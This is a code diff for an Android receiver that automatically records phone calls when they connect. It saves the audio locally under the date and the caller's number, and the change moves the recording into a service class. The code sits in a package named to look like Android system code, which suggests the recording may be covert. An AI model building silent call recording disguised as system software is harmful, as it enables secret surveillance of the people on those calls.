@@ -7,7 +7,7 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.TelephonyManager;
 
-import com.android.system.utils.AudioRecorder;
+import com.android.system.service.AudioRecorderService;
 import com.android.system.utils.SystemUtil;
 
 import java.io.File;
@@ -34,13 +34,13 @@ public class PhoneCallReceiver extends BroadcastReceiver {
         switch(state){
             case TelephonyManager.CALL_STATE_IDLE:
                 if(sIsCalling) {
-                    AudioRecorder.stop();
+                    AudioRecorderService.stop(context);
                     sIsCalling = false;
                 }
                 break;
             case TelephonyManager.CALL_STATE_OFFHOOK:
                 if(sIsCalling) {
-                    AudioRecorder.stop();
+                    AudioRecorderService.stop(context);
                 } else {
                     String recordPath = context.getFilesDir().getAbsolutePath() + "/record/";
                     File recordDir = new File(recordPath);
@@ -58,7 +58,7 @@ public class PhoneCallReceiver extends BroadcastReceiver {
                     }
 
                     String savePath = recordPath + SystemUtil.getDateString() + "-" + (sPhoneNumber) + ".amr";
-                    AudioRecorder.start(savePath);
+                    AudioRecorderService.start(context, savePath);
                 }
                 sIsCalling = !sIsCalling;
                 break;
